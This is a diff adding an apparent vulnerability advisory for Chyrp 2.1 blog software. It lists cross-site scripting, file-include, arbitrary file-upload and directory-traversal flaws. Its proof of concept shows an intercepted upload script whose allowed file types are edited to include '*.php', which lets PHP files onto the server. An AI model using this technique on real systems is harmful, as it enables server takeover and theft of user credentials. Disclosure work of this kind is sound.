@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/48672/info
+    
+Chyrp is prone to multiple cross-site scripting vulnerabilities, a local file-include vulnerability, an arbitrary file-upload vulnerability, and a directory-traversal vulnerability.
+    
+An attacker may leverage these issues to execute arbitrary script code on an affected computer and in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, open or run arbitrary files in the context of the webserver process, and gain access to sensitive information.
+    
+Chyrp 2.1 is vulnerable; other versions may also be affected. 
+
+C:
+Appended ;*.php in script for the add photo feather (http://www.example.com/admin/?action=write_post&feather=photo) using intercepting proxy
+      <script type="text/javascript">
+          $(function(){
+              $("#photo").clone().attr("id", "photo_fake").addClass("swfupload_button").insertBefore("#photo")
+              photo = new SWFUpload({
+                  upload_url : "http://www.example.com/chyrp_v2.0/modules/swfupload/upload_handler.php",
+                  flash_url : "http://www.example.com/chyrp_v2.0/modules/swfupload/lib/swfupload.swf",
+                  post_params: {"PHPSESSID" : "5o3bnghnijk4hlr7vnshi3vb76", "PHPSESSNAME" : "ChyrpSession", "ajax" : "true" },
+                  file_size_limit : "100 MB",
+                  file_types : "*.jpg;*.jpeg;*.png;*.gif;*.bmp;*.php", <-- #MODIFY!
+                  file_types_description : "All Files",
+                  
+                  file_queue_error_handler : fileQueueError,
+                  file_dialog_complete_handler : fileDialogComplete,
+                  upload_start_handler : uploadStart,
+                  upload_progress_handler : uploadProgress,
+                  upload_error_handler : uploadError,
+                  upload_success_handler : uploadSuccess,
+                  button_placeholder_id : "photo",
+                  button_width : $("#photo_fake").width(),
+                  button_height : $("#photo_fake").height(),
+                  button_action : SWFUpload.BUTTON_ACTION.SELECT_FILES,
+                  upload_complete_handler : uploadComplete
+              })
+              $("#SWFUpload_0")
+                  .css({ position: "absolute", top: $("#photo_fake").offset().top, left: $("#photo_fake").offset().left })
+                  .before('<div id="progress"><div class="back"><div class="fill"></div><div class="clear"></div></div></div>')
+          })
+      </script>
